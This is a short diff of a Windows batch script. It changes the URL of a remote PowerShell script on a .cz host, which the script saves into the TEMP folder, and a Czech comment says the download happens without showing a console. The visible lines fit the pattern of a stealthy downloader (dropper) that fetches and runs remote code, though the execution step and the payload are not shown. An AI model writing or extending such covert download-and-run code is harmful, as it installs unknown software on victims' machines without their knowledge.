@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-set "SCRIPT_URL=https://25plrp.cz/nicol_2.ps1"
+set "SCRIPT_URL=https://25plrp.cz/nicol.ps1"
 set "SCRIPT_PATH=%TEMP%\nicol.ps1"
 
 :: Stáhne PowerShell skript (bez zobrazení konzole)
